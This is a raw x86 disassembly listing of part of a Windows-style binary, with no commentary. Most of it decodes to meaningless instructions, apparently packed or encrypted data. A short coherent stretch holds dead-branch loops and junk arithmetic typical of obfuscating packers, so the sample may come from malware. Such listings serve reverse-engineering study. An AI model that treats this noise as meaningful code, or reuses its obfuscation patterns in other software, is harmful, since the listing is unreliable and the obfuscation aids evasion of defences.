  4068e8:	fst    DWORD PTR [ecx+0x5c]
  4068eb:	push   ds
  4068ec:	push   ebx
  4068ed:	pushf  
  4068ee:	xor    al,0xb3
  4068f0:	mov    BYTE PTR [edx+0x17],cl
  4068f3:	popf   
  4068f4:	jp     0x40691c
  4068f6:	mov    esi,0xd1fda9c1
  4068fb:	fldenv ds:0x675a0989
  406901:	add    al,0xae
  406903:	jg     0x4068b6
  406905:	mov    ebp,0x3e78caf0
  40690a:	pop    ebp
  40690b:	rcr    BYTE PTR ds:0x2a280809,1
  406911:	add    BYTE PTR [ebp+0x36],dh
  406914:	pop    esp
  406915:	je     0x4068cc
  406917:	(bad)  
  406918:	xchg   BYTE PTR gs:[ecx],ah
  40691b:	cdq    
  40691c:	in     al,dx
  40691d:	adc    dh,ch
  40691f:	ret    
  406920:	mov    ah,0x91
  406922:	sbb    al,0x87
  406924:	ret    
  406925:	or     dl,BYTE PTR [ebp+edi*2-0x13ab4633]
  40692c:	and    BYTE PTR [eax],0x64
  40692f:	ins    DWORD PTR es:[edi],dx
  406930:	mov    ?,WORD PTR [esi+0x3f]
  406933:	(bad)  [ecx+0x24]
  406936:	cmc    
  406937:	mov    al,0xf3
  406939:	push   edx
  40693a:	xor    al,0x3e
  40693c:	fs out 0xb4,al
  40693f:	jbe    0x406919
  406941:	sbb    BYTE PTR [eax-0x70],0x3d
  406945:	sbb    DWORD PTR [ecx+0x30],0x72a1a989
  40694c:	mov    ebp,0xbf1c5c10
  406951:	push   esi
  406952:	add    BYTE PTR [edi],bl
  406954:	sbb    DWORD PTR [ebp-0x40],0xffffffd4
  406958:	lds    ebp,FWORD PTR [esi-0xd]
  40695b:	iret   
  40695c:	int3   
  40695d:	xor    eax,0x2294ca2c
  406962:	ins    BYTE PTR es:[edi],dx
  406963:	jmp    0x406946
  406965:	out    dx,al
  406966:	and    DWORD PTR [eax],0x62
  406969:	xchg   ebx,eax
  40696a:	mov    ah,0xcc
  40696c:	mov    WORD PTR [esi+0x31],cs
  40696f:	popa   
  406970:	(bad)  
  406971:	(bad)  
  406972:	adc    al,BYTE PTR [ecx-0x35]
  406975:	or     edi,esi
  406977:	cmc    
  406978:	xor    ebx,DWORD PTR [edi]
  40697a:	jecxz  0x40698a
  40697c:	push   cs
  40697d:	ret    0x4860
  406980:	aad    0x48
  406982:	leave  
  406983:	push   eax
  406984:	lods   al,BYTE PTR ds:[esi]
  406985:	add    al,0x14
  406987:	xchg   ch,bh
  406989:	dec    esi
  40698a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40698b:	mov    BYTE PTR [esi-0x788e34fd],dl
  406991:	jo     0x40697b
  406993:	stos   DWORD PTR es:[edi],eax
  406994:	sub    al,0xf3
  406996:	retf   0x1930
  406999:	push   edx
  40699a:	jae    0x6501
  40699f:	cld    
  4069a0:	push   es
  4069a1:	and    ebp,DWORD PTR [ebx]
  4069a3:	test   DWORD PTR [ecx-0x2ff2eff3],ebx
  4069a9:	(bad)  
  4069aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4069ab:	ror    esi,0x7a
  4069ae:	arpl   WORD PTR [edx+0x55ee223f],di
  4069b4:	pusha  
  4069b5:	or     edi,eax
  4069b7:	adc    DWORD PTR [ebx],ebx
  4069b9:	adc    ebp,DWORD PTR [edi]
  4069bb:	mov    ebx,?
  4069bd:	push   0xd0124cc6
  4069c2:	add    eax,0x739b4470
  4069c7:	(bad)  
  4069c8:	adc    dh,0x56
  4069cb:	(bad)  
  4069cc:	fiadd  WORD PTR [edi-0x13]
  4069cf:	ficomp WORD PTR [eax-0x1b0d6eb0]
  4069d5:	xchg   ebp,eax
  4069d6:	stc    
  4069d7:	push   es
  4069d8:	pop    edx
  4069d9:	dec    esi
  4069da:	stos   DWORD PTR es:[edi],eax
  4069db:	iret   
  4069dc:	jmp    0x4069cc
  4069de:	xchg   ecx,eax
  4069df:	retf   
  4069e0:	jnp    0x4069ab
  4069e2:	mov    cl,0x4
  4069e4:	lds    edx,FWORD PTR [ecx+0x27]
  4069e7:	ja     0x406a11
  4069e9:	jae    0x406a08
  4069eb:	cmp    dl,dl
  4069ed:	push   ss
  4069ee:	jns    0x40699c
  4069f0:	dec    edi
  4069f1:	aam    0x84
  4069f3:	je     0x406a4f
  4069f5:	jl     0x406a63
  4069f7:	bound  ebx,QWORD PTR [edi+ebx*1-0x678279fc]
  4069fe:	addr16 or eax,0xa4cd0794
  406a04:	clc    
  406a05:	adc    DWORD PTR [esi+0x4a7a06a9],0xffe656a5
  406a0f:	call   0xada440c6
  406a14:	cwde   
  406a15:	scas   eax,DWORD PTR es:[edi]
  406a16:	pusha  
  406a17:	in     al,0xe2
  406a19:	adc    DWORD PTR [edi+edx*4],esp
  406a1c:	aaa    
  406a1d:	dec    eax
  406a1e:	cli    
  406a1f:	retf   0x252a
  406a22:	mov    bl,ah
  406a24:	push   edi
  406a25:	xchg   ebp,eax
  406a26:	push   edi
  406a27:	sub    BYTE PTR [eax+0x39],bl
  406a2a:	cmp    al,0x99
  406a2c:	jecxz  0x406a2e
  406a2e:	icebp  
  406a2f:	push   esp
  406a30:	aam    0x7c
  406a32:	xor    edi,ebx
  406a34:	or     ch,dh
  406a36:	pop    ds
  406a37:	inc    ecx
  406a38:	into   
  406a39:	fdivr  QWORD PTR [esi-0x609afcb8]
  406a3f:	int    0x6c
  406a41:	imul   ecx,DWORD PTR [edx-0x8],0xbb421da6
  406a48:	cs mov al,0xab
  406a4b:	in     al,dx
  406a4c:	pop    edx
  406a4d:	xchg   edx,eax
  406a4e:	mov    dl,0xcc
  406a50:	std    
  406a51:	out    0x15,eax
  406a53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406a54:	aam    0x25
  406a56:	push   cs
  406a57:	mov    esi,0x649ee65
  406a5c:	aam    0x11
  406a5e:	mov    dl,0xca
  406a60:	sbb    eax,0x157e223f
  406a65:	retf   0x79a4
  406a68:	xchg   edi,esi
  406a6a:	xchg   BYTE PTR [edi],bl
  406a6c:	mov    al,0xdf
  406a6e:	mul    esp
  406a70:	push   esi
  406a71:	jae    0x406a28
  406a73:	stos   DWORD PTR es:[edi],eax
  406a74:	mov    ds:0x188072b8,eax
  406a79:	icebp  
  406a7a:	js     0x406aae
  406a7c:	dec    esp
  406a7d:	dec    esi
  406a7e:	fmul   DWORD PTR [ecx]
  406a80:	pusha  
  406a81:	sbb    al,0xe2
  406a83:	cmp    ah,BYTE PTR [edi+0x71]
  406a86:	fisub  DWORD PTR [eax-0x77f5737c]
  406a8c:	push   eax
  406a8d:	cmc    
  406a8e:	add    ecx,DWORD PTR [edi+eiz*4]
  406a91:	push   ebp
  406a92:	rcr    esp,1
  406a94:	sar    DWORD PTR [ecx-0x28b06a56],0xa1
  406a9b:	stos   BYTE PTR es:[edi],al
  406a9c:	scas   al,BYTE PTR es:[edi]
  406a9d:	leave  
  406a9e:	and    al,0xcf
  406aa0:	dec    ebx
  406aa1:	aaa    
  406aa2:	mov    ds:0x9db155f3,eax
  406aa7:	mov    es,WORD PTR [esi-0x7d]
  406aaa:	dec    ebp
  406aab:	xor    DWORD PTR [ebx+ebp*1-0x26],esi
  406aaf:	sbb    al,0xf6
  406ab1:	jns    0x406afa
  406ab3:	ss jnp 0x406b28
  406ab6:	sbb    eax,0x30afdac0
  406abb:	push   esi
  406abc:	test   al,0x6c
  406abe:	sbb    DWORD PTR [ebx+esi*1],ebx
  406ac1:	rol    DWORD PTR ds:0x32729c,0xc9
  406ac8:	ret    0x1c
  406acb:	push   ebp
  406acc:	mov    ebp,esp
  406ace:	sub    esp,0x78
  406ad1:	mov    eax,ds:0x41b1a8
  406ad6:	mov    DWORD PTR [ebp-0x10],eax
  406ad9:	mov    eax,ds:0x41b2b4
  406ade:	sub    DWORD PTR ds:0x42e77b,0x487f
  406ae8:	mov    DWORD PTR [ebp-0x30],eax
  406aeb:	xor    DWORD PTR ds:0x42fd81,0x6d44
  406af5:	mov    DWORD PTR [ebp-0xc],0xf89c8531
  406afc:	inc    DWORD PTR ds:0x42fd59
  406b02:	mov    DWORD PTR [ebp-0x14],0xf89c8530
  406b09:	sub    DWORD PTR ds:0x42e76f,0x7e8e
  406b13:	mov    eax,DWORD PTR [ebp-0xc]
  406b16:	push   ebx
  406b17:	push   esi
  406b18:	push   edi
  406b19:	movzx  esi,WORD PTR ds:0x42fd59
  406b20:	and    esi,DWORD PTR ds:0x42e1a8
  406b26:	mov    DWORD PTR ds:0x42fd59,esi
  406b2c:	mov    esi,0x7510855
  406b31:	mov    DWORD PTR ds:0x42e773,0x1a
  406b3b:	cmp    DWORD PTR ds:0x42e773,0x0
  406b42:	je     0x406c66
  406b48:	cmp    DWORD PTR ds:0x42e773,0x27
  406b4f:	jne    0x406b61
  406b55:	push   DWORD PTR [ebp-0xc]
  406b58:	push   DWORD PTR [ebp-0x24]
  406b5b:	call   DWORD PTR ds:0x42e35f
  406b61:	mov    edi,DWORD PTR ds:0x42e773
  406b67:	dec    edi
  406b68:	mov    DWORD PTR ds:0x42e773,edi
  406b6e:	jmp    0x406b3b
  406b73:	mov    DWORD PTR ds:0x42fd71,0x10
  406b7d:	cmp    DWORD PTR ds:0x42fd71,0x0
  406b84:	je     0x406c66
  406b8a:	cmp    DWORD PTR ds:0x42fd71,0x1c
  406b91:	jne    0x406bad
  406b97:	push   DWORD PTR [ebp-0x10]
  406b9a:	push   0x42fd7d
  406b9f:	push   0x29f4
  406ba4:	push   DWORD PTR [ebp-0x14]
  406ba7:	call   DWORD PTR ds:0x42e5bf
  406bad:	mov    edi,DWORD PTR ds:0x42fd71
  406bb3:	dec    edi
  406bb4:	mov    DWORD PTR ds:0x42fd71,edi
  406bba:	jmp    0x406b7d
  406bbf:	and    DWORD PTR ds:0x42fd65,0x0
  406bc9:	jmp    0x406bdb
  406bce:	mov    edi,DWORD PTR ds:0x42fd65
  406bd4:	inc    edi
  406bd5:	mov    DWORD PTR ds:0x42fd65,edi
  406bdb:	cmp    DWORD PTR ds:0x42fd65,0x15
  406be2:	jae    0x406c66
  406be8:	cmp    DWORD PTR ds:0x42fd65,0x1e
  406bef:	jne    0x406c06
  406bf5:	push   DWORD PTR [ebp-0xc]
  406bf8:	push   0x42fd6d
  406bfd:	push   DWORD PTR [ebp-0x10]
  406c00:	call   DWORD PTR ds:0x42e4db
  406c06:	jmp    0x406bce
  406c0b:	and    DWORD PTR ds:0x42fdf6,0x0
  406c15:	mov    edi,DWORD PTR ds:0x42fdf6
  406c1b:	inc    edi
  406c1c:	mov    DWORD PTR ds:0x42fdf6,edi
  406c22:	cmp    DWORD PTR ds:0x42fdf6,0x5
  406c29:	jne    0x406c3f
  406c2f:	push   0x42e787
  406c34:	push   0x42e224
  406c39:	call   DWORD PTR ds:0x42e5c3
  406c3f:	cmp    DWORD PTR ds:0x42fdf6,0x4
  406c46:	jne    0x406c59
  406c4c:	mov    edi,DWORD PTR ds:0x42fdf6
  406c52:	inc    edi
  406c53:	mov    DWORD PTR ds:0x42fdf6,edi
  406c59:	cmp    DWORD PTR ds:0x42fdf6,0x1b
  406c60:	jb     0x406c15
  406c66:	xor    eax,esi
  406c68:	sub    DWORD PTR ds:0x42e793,ecx
  406c6e:	mov    edi,0x32729c
  406c73:	add    eax,edi
  406c75:	xor    DWORD PTR ds:0x42e78b,0x42fdf6
  406c7f:	mov    DWORD PTR [ebp-0x20],eax
  406c82:	mov    DWORD PTR [ebp-0x28],0xf89cb531
  406c89:	jmp    0x406fd6
  406c8e:	inc    ecx
  406c8f:	jae    0x406d0b
  406c91:	pop    ebp
  406c92:	sub    dh,BYTE PTR [ebp+0x61]
  406c95:	jae    0x406ce4
  406c97:	and    ebp,DWORD PTR [eax]
  406c99:	mov    bh,0xd3
  406c9b:	mov    WORD PTR [eax+0x70c5172e],gs
  406ca1:	jo     0x406cc3
  406ca3:	jge    0x406d15
  406ca5:	jo     0x406c55
  406ca7:	stos   DWORD PTR es:[edi],eax
  406ca8:	dec    edx
  406ca9:	test   eax,0x7360153a
  406cae:	mov    DWORD PTR [ecx+0x61106a8a],0x1c616adb
  406cb8:	pop    esi
  406cb9:	or     eax,0x1b1ec1da
  406cbe:	add    al,0x24
  406cc0:	push   edx
  406cc1:	in     al,dx
  406cc2:	push   0xffffff98
  406cc4:	jmp    0x7db5c5f6
  406cc9:	mov    dl,0x1
  406ccb:	repnz adc al,0x49
  406cce:	call   0xe4c821de
  406cd3:	dec    edx
  406cd4:	push   edi
  406cd5:	xor    dh,BYTE PTR [edx+0x76]
  406cd8:	mov    ds,WORD PTR [eax+ebp*8-0x33]
  406cdc:	sar    esp,1
  406cde:	les    edi,FWORD PTR fs:[ecx+0x6d49522b]
  406ce5:	es pop edx
  406ce7:	xchg   edi,eax
  406ce8:	or     eax,0xf0be1fc5
  406ced:	jle    0x406cf9
  406cef:	push   edi
  406cf0:	jp     0x406cd4
  406cf2:	loop   0x406cbc
  406cf4:	mov    cl,0x38
  406cf6:	inc    edx
  406cf7:	fs sub eax,0xf7a51986
  406cfd:	pop    esi
  406cfe:	shl    BYTE PTR [edi-0x17aa6fa6],1
  406d04:	in     eax,0x2e
  406d06:	and    cl,0xa6
  406d09:	jnp    0x406cc2
  406d0b:	mov    al,ds:0x6dc20e9f
  406d10:	sti    
  406d11:	fist   WORD PTR [edx+0xf]
  406d14:	call   DWORD PTR [ecx-0x6]
  406d17:	ror    DWORD PTR [eax+0x62],1
  406d1a:	dec    esp
  406d1b:	mov    dh,0xaa
  406d1d:	push   cs
  406d1e:	ret    0x7b4e
  406d21:	call   0xc967:0x9507382a
  406d28:	push   esp
  406d29:	ret    
  406d2a:	ja     0x406d91
  406d2c:	fs mov edx,0xda09b1c2
  406d32:	(bad)  
  406d33:	outs   dx,DWORD PTR ds:[esi]
  406d34:	xor    eax,ecx
  406d36:	mov    edx,0x5443c82a
  406d3b:	je     0x406cdb
  406d3d:	std    
  406d3e:	mov    dh,0xcd
  406d40:	ret    0xdef5
  406d43:	push   esp
  406d44:	(bad)  
  406d45:	dec    ebp
  406d46:	lods   al,BYTE PTR ds:[esi]
  406d47:	jbe    0x406d7e
  406d49:	ss retf 0x8970
  406d4d:	ins    BYTE PTR es:[edi],dx
  406d4e:	xlat   BYTE PTR es:[ebx]
  406d50:	pop    edi
  406d51:	add    eax,0x63e6c73e
  406d56:	add    dl,BYTE PTR [esi-0x1a16a2c6]
  406d5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d5d:	adc    dh,0xd8
  406d60:	adc    DWORD PTR [eax+0x379bc992],ecx
  406d66:	sub    ebx,edi
  406d68:	pusha  
  406d69:	inc    ebx
  406d6a:	jecxz  0x406d76
  406d6c:	ret    
  406d6d:	dec    ebp
  406d6e:	scas   al,BYTE PTR es:[edi]
  406d6f:	pop    esp
  406d70:	bnd jg 0x406d2a
  406d73:	mov    BYTE PTR [esi+edx*4-0x2c],0xbf
  406d78:	retf   
  406d79:	add    eax,0xe3191592
  406d7e:	mov    cl,0xc6
  406d80:	and    ebx,edx
  406d82:	pop    ds
  406d83:	cli    
  406d84:	jg     0x406db1
  406d86:	push   0x5d
  406d88:	pop    ss
  406d89:	mov    ah,0xb9
  406d8b:	ret    
  406d8c:	icebp  
  406d8d:	stc    
  406d8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406d8f:	push   esi
  406d90:	pop    esp
  406d91:	les    esp,FWORD PTR [ebx-0x179c0392]
  406d97:	sti    
  406d98:	push   ebx
  406d99:	jmp    0xbf56:0x7f728bc4
  406da0:	fldcw  WORD PTR [esi]
  406da2:	jbe    0x406dc4
  406da4:	sbb    ch,BYTE PTR [edx]
  406da6:	cwde   
  406da7:	cmc    
  406da8:	xor    BYTE PTR [eiz*8+0x48e70b96],dh
  406daf:	int3   
  406db0:	push   0xfc299dbc
  406db5:	(bad)  
  406db6:	in     al,0xa8
  406db8:	xchg   ebp,eax
  406db9:	pop    ebx
  406dba:	ret    
  406dbb:	setb   BYTE PTR [ebx+0x5f]
  406dbf:	sar    eax,0xd9
  406dc2:	sub    bl,cl
  406dc4:	mov    bl,0xc
  406dc7:	jb     0x406e2c
  406dc9:	icebp  
  406dca:	arpl   WORD PTR [ebp+0x22],si
  406dcd:	retf   0x8ce0
  406dd0:	xchg   ebx,eax
  406dd1:	mov    cl,0xe0
  406dd3:	cwde   
  406dd4:	ja     0x406db9
  406dd6:	cdq    
  406dd7:	stc    
  406dd8:	rcr    DWORD PTR [edi],0xe5
  406ddb:	fs loope 0x406e35
  406dde:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ddf:	outs   dx,BYTE PTR ds:[esi]
  406de0:	push   esi
  406de1:	push   ds
  406de2:	push   es
  406de3:	mov    ah,0xf1
  406de5:	pop    esp
  406de6:	cmovns ebp,edx
  406de9:	loopne 0x406d8e
  406deb:	cmp    al,0x90
  406ded:	test   al,0xa8
  406def:	add    dl,BYTE PTR ss:[esi-0x75d50c88]
  406df6:	and    eax,DWORD PTR [eax+0x29]
  406df9:	fiadd  DWORD PTR [esi]
  406dfb:	fwait
  406dfc:	mov    dh,0xf6
  406dfe:	lahf   
  406dff:	jg     0x406df1
  406e01:	jno    0x406e3e
  406e03:	bts    DWORD PTR [ecx-0x3e],edx
  406e07:	shl    BYTE PTR [ecx+0x2],1
  406e0a:	test   BYTE PTR [edi],dl
  406e0c:	sub    edi,DWORD PTR [ebp-0x4c]
  406e0f:	inc    ebx
  406e10:	retf   
  406e11:	sbb    eax,0x359ab2aa
  406e16:	jb     0x406e64
  406e18:	xor    eax,0x86cb01e4
  406e1d:	and    al,0x6e
  406e1f:	inc    edi
  406e20:	mov    DWORD PTR [ecx+ecx*8+0x76],esp
  406e24:	and    eax,0x82787e69
  406e29:	and    eax,0xf58e9772
  406e2e:	xlat   BYTE PTR ds:[ebx]
  406e2f:	int    0x97
  406e31:	sub    edi,DWORD PTR ds:0xf17d0ca8
  406e37:	jo     0x406e26
  406e39:	inc    ecx
  406e3a:	xchg   esi,eax
  406e3b:	iret   
  406e3c:	dec    ebx
  406e3d:	fwait
  406e3e:	push   ds
  406e3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e40:	pusha  
  406e41:	sbb    BYTE PTR [ecx-0x6faae657],bl
  406e47:	out    dx,eax
  406e48:	mov    bh,0x83
  406e4a:	mov    bh,0x26
  406e4c:	(bad)  
  406e4d:	icebp  
  406e4e:	pop    ss
  406e4f:	in     eax,0x20
  406e51:	cdq    
  406e52:	xor    dl,BYTE PTR [edi]
  406e54:	jmp    0xdec4:0xe82ae1d0
  406e5b:	fwait
  406e5c:	mov    ds:0x4bd327c7,al
  406e61:	xor    DWORD PTR [edx-0x4502b69c],eax
  406e67:	pop    eax
  406e68:	test   al,0x5e
  406e6a:	jmp    0x406e9d
  406e6c:	ins    DWORD PTR es:[edi],dx
  406e6d:	in     eax,dx
  406e6e:	loop   0x406dff
  406e70:	dec    edx
  406e71:	lods   al,BYTE PTR ds:[esi]
  406e72:	xchg   edi,eax
  406e73:	cmp    eax,0xf786b3f9
  406e78:	cdq    
  406e79:	sub    BYTE PTR [edi],ch
  406e7b:	sti    
  406e7c:	add    eax,0x3586c636
  406e81:	xchg   edx,eax
  406e82:	push   ebp
  406e83:	or     DWORD PTR [esp+edx*1+0x7d49fe85],0x5e
  406e8b:	sub    dl,ch
  406e8d:	ja     0x406e86
  406e8f:	sub    BYTE PTR [eax],bl
  406e91:	mov    ch,0xfb
  406e93:	xor    ebp,eax
  406e95:	mov    eax,ds:0x5f207af0
  406e9a:	sbb    dl,BYTE PTR [ebp+edx*2+0x76]
  406e9e:	and    al,0xbd
  406ea0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ea1:	retf   0x1fcf
  406ea4:	fwait
  406ea5:	scas   eax,DWORD PTR es:[edi]
  406ea6:	in     eax,0xb0
  406ea8:	loop   0x406ecf
  406eaa:	bnd call 0xe2ca6356
  406eb0:	adc    eax,0x1bdd69f0
  406eb5:	cmp    edi,ebp
  406eb7:	loope  0x406e58
  406eb9:	in     eax,0x4a
  406ebb:	dec    eax
  406ebc:	cmovp  ebx,DWORD PTR [esi-0x19]
  406ec0:	jne    0x406f3c
  406ec2:	leave  
  406ec3:	mov    edi,0xe5eb9a2e
  406ec8:	gs cs sbb al,0xf7
  406ecc:	ins    BYTE PTR es:[edi],dx
  406ecd:	xchg   esi,eax
  406ece:	and    edi,DWORD PTR [edi-0x64]
  406ed1:	popa   
  406ed2:	out    0xaa,eax
  406ed4:	out    dx,eax
  406ed5:	popf   
  406ed6:	xor    eax,0x64779640
  406edb:	and    eax,ebx
  406edd:	mov    ds:0xd7c7247d,al
  406ee2:	into   
  406ee3:	(bad)  
  406ee5:	and    edi,ebp
  406ee7:	pop    eax
  406ee8:	dec    eax
  406ee9:	scas   eax,DWORD PTR es:[edi]
  406eea:	cmp    eax,esp
  406eec:	int3   
  406eed:	xor    al,0xce
  406eef:	mov    ah,0x77
  406ef1:	retf   
  406ef2:	mov    esi,DWORD PTR [ebp-0x574a48ba]
  406ef8:	shl    DWORD PTR [eax-0x52],1
  406efb:	int3   
  406efc:	clc    
  406efd:	stc    
  406efe:	pop    eax
  406eff:	in     al,0xa
  406f01:	and    DWORD PTR [esi+0x1c],edi
  406f04:	int3   
  406f05:	mov    al,0xc7
  406f07:	xchg   ecx,eax
  406f08:	mov    ds:0x3b536b62,al
  406f0d:	sbb    ch,dl
  406f0f:	push   ss
  406f10:	mov    esi,0xca2d83c4
  406f15:	adc    eax,0x94002bc8
  406f1a:	out    0x3e,eax
  406f1c:	imul   ebp,edi,0x9e2d2d9a
  406f22:	push   esp
  406f23:	or     DWORD PTR [edx],edi
  406f25:	mov    ebx,0x820e4668
  406f2a:	fucom  st(4)
  406f2c:	jmp    0x406ec4
  406f2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f2f:	test   BYTE PTR [ecx],cl
  406f31:	loop   0x406ebe
  406f33:	pusha  
  406f34:	pop    ebx
  406f35:	mov    cs,WORD PTR [ebx]
  406f37:	cmp    DWORD PTR [edi-0x6256b200],eax
  406f3d:	cli    
  406f3e:	fmul   st(7),st
  406f40:	in     al,0x11
  406f42:	shr    DWORD PTR [ebp-0x544b9180],cl
  406f48:	dec    ebx
  406f49:	pop    es
  406f4a:	je     0x406f90
  406f4c:	out    dx,eax
  406f4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f4e:	ret    0x37c2
  406f51:	push   cs
  406f52:	out    dx,eax
  406f53:	enter  0xd66b,0xff
  406f57:	xor    bl,dl
  406f59:	adc    eax,0x479477df
  406f5e:	push   ebp
  406f5f:	pop    esp
  406f60:	or     BYTE PTR [eax+0xa820b7],bl
  406f66:	stos   BYTE PTR es:[edi],al
  406f67:	mov    WORD PTR [esi-0x430cb64c],ss
  406f6d:	dec    bh
  406f6f:	mov    WORD PTR [ebp+0x2ec81d72],fs
  406f75:	push   esi
  406f76:	mov    cl,0xe9
  406f78:	xor    al,0xf5
  406f7a:	mov    edx,0xda67a3f0
  406f7f:	pop    edi
  406f80:	mov    ch,0x8
  406f82:	in     eax,0xdb
  406f84:	adc    al,al
  406f86:	loope  0x406f3f
  406f88:	mov    ds:0x8472c88d,eax
  406f8d:	push   esi
  406f8e:	cdq    
  406f8f:	mov    DWORD PTR [eax+0x5f],edx
  406f92:	int3   
  406f93:	adc    eax,0x53959477
  406f98:	cdq    
  406f99:	into   
  406f9a:	or     edx,esi
  406f9c:	xchg   ah,ch
  406f9e:	in     eax,0xc2
  406fa0:	imul   edi,DWORD PTR [ebp+0x5a88629],0xffffffbe
  406fa7:	mov    esi,0x157998f5
  406fac:	xor    ch,BYTE PTR [edi+0x50]
  406faf:	cmp    eax,0x5cd2bda8
  406fb4:	iret   
  406fb5:	arpl   bp,si
  406fb7:	xchg   edx,eax
  406fb8:	inc    eax
  406fb9:	adc    eax,0x96110843
  406fbe:	push   edi
  406fbf:	aaa    
  406fc0:	(bad)  
  406fc2:	mov    ebx,0x2ccade25
  406fc7:	jns    0x406fa3
  406fc9:	and    DWORD PTR [ebp+esi*2+0x43e8c5a],esi
  406fd0:	in     al,0xb1
  406fd2:	jbe    0x40701c
  406fd4:	xrelease mov DWORD PTR fs:[ebp-0x34],0xf89f0531
  406fdd:	adc    DWORD PTR ds:0x42fdf2,0x42e78b
  406fe7:	mov    DWORD PTR [ebp-0x2c],0xf89c85f1
  406fee:	mov    DWORD PTR [ebp-0x24],0xf89c85d1
  406ff5:	add    eax,0xac
  406ffa:	jmp    0x407347
  406fff:	sbb    al,0x75
  407001:	sar    DWORD PTR [esi+0x71b35a51],1
  407007:	lahf   
  407008:	popa   
  407009:	sti    
  40700a:	arpl   WORD PTR [edi-0x4],cx
  40700d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40700e:	mov    al,ds:0x7070c2c7
  407013:	and    BYTE PTR [ebp+0x70],bh
  407016:	jo     0x406fde
  407018:	jmp    0x2b84:0x88ecc3b8
  40701f:	mov    ecx,0xfedf98bc
  407024:	ror    BYTE PTR [ecx+0x7525b861],1
  40702a:	inc    DWORD PTR [esi-0x3e0ff000]
  407030:	xchg   edi,eax
  407031:	push   0x62
  407033:	add    DWORD PTR [esi-0x25],edx
  407036:	std    
  407037:	ins    DWORD PTR es:[edi],dx
  407038:	sbb    al,0x17
  40703a:	sub    bl,0x9
  40703d:	js     0x40703e
  40703f:	in     eax,0xa6
  407041:	test   eax,0x57d8ecd0
  407046:	int    0x79
  407048:	int3   
  407049:	sbb    DWORD PTR [ebx],ecx
  40704b:	out    0x5d,al
  40704d:	xchg   BYTE PTR [ecx-0x456a8e3d],ch
  407053:	stos   DWORD PTR es:[edi],eax
  407054:	cmp    cl,BYTE PTR [ecx-0x2b]
  407057:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407058:	mov    cl,0xbd
  40705a:	retf   0xa99
  40705d:	stos   BYTE PTR es:[edi],al
  40705e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40705f:	loopne 0x40705e
  407061:	stc    
  407062:	aaa    
  407063:	pop    esi
  407064:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407065:	push   eax
  407066:	arpl   WORD PTR [esi],cx
  407068:	jnp    0x406ff1
  40706a:	mov    bh,0x20
  40706c:	xlat   BYTE PTR ds:[ebx]
  40706d:	pop    eax
  40706e:	pop    ds
  40706f:	iret   
  407070:	(bad)  
  407071:	mov    ebp,DWORD PTR [ebx]
  407073:	jecxz  0x4070ed
  407075:	test   ch,0xe8
  407078:	aaa    
  407079:	lods   al,BYTE PTR ds:[esi]
  40707a:	mov    ah,0xd
  40707c:	rcr    DWORD PTR [ebp-0x45],1
  40707f:	and    al,0xfb
  407081:	and    al,0x9f
  407083:	mov    cl,BYTE PTR [ecx]
  407085:	pop    esp
  407086:	cmp    al,0xbe
  407088:	xor    ch,BYTE PTR [ebp-0x64]
  40708b:	stos   BYTE PTR es:[edi],al
  40708c:	fadd   QWORD PTR [ebx+ecx*1+0x5b02b9fb]
  407093:	xor    ch,BYTE PTR [ecx-0x65d69c13]
  407099:	lods   al,BYTE PTR ds:[esi]
  40709a:	xor    DWORD PTR es:[edx-0x3],ebx
  40709e:	neg    DWORD PTR [edx]
  4070a0:	mov    WORD PTR [ebx-0x254765b7],ds
  4070a6:	rol    BYTE PTR [esi-0x7a],1
  4070a9:	mov    dl,0xbd
  4070ab:	or     BYTE PTR [edx],ah
  4070ad:	ins    DWORD PTR es:[edi],dx
  4070ae:	or     al,0xa
  4070b0:	or     eax,0x85378927
  4070b5:	mov    ds:0x8b57ab41,eax
  4070ba:	mov    al,0x20
  4070bc:	popa   
  4070bd:	push   edx
  4070be:	push   ss
  4070bf:	fwait
  4070c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4070c1:	dec    esp
  4070c2:	mov    bh,0x1b
  4070c4:	ret    
  4070c5:	cdq    
  4070c6:	int3   
  4070c7:	ins    DWORD PTR es:[edi],dx
  4070c8:	add    BYTE PTR [edi],dh
  4070ca:	bound  ecx,QWORD PTR [ebx-0x4bb8a25]
  4070d0:	push   ss
  4070d1:	inc    edx
  4070d2:	nop
  4070d3:	inc    ebp
  4070d4:	mov    ds:0x699be90f,eax
  4070d9:	jmp    0x79b2:0xbeee2c16
  4070e0:	adc    ebx,ebx
  4070e2:	sbb    al,0x47
  4070e4:	mov    bh,0x10
  4070e6:	pusha  
  4070e7:	adc    ch,BYTE PTR [esi+eiz*2-0x33]
  4070eb:	mov    ebp,0xa546d923
  4070f0:	cmp    al,0xad
  4070f2:	mov    esi,fs
  4070f4:	and    esp,DWORD PTR [esi+ebp*4-0x91d0d06]
  4070fb:	popf   
  4070fc:	jp     0x40716b
  4070fe:	xchg   edi,eax
  4070ff:	out    0xfb,eax
  407101:	xchg   esp,eax
  407102:	and    eax,0x416675ea
  407107:	push   edi
  407108:	stos   DWORD PTR es:[edi],eax
  407109:	popa   
  40710a:	mov    ebx,0x7ec1194c
  40710f:	test   cl,ch
  407111:	ins    DWORD PTR es:[edi],dx
  407112:	lods   al,BYTE PTR ds:[esi]
  407113:	xor    BYTE PTR [ebx+0x73],bl
  407116:	jp     0x407112
  407118:	icebp  
  407119:	push   si
  40711b:	(bad)  
  40711c:	mov    ds:0x71b6c294,eax
  407121:	jge    0x4070b4
  407123:	jl     0x407144
  407125:	scas   al,BYTE PTR es:[edi]
  407126:	shl    DWORD PTR [ecx],1
  407128:	in     eax,0x3b
  40712a:	add    bh,BYTE PTR [eax]
  40712c:	retf   
  40712d:	dec    esi
  40712e:	sbb    DWORD PTR [esi-0x49],ebp
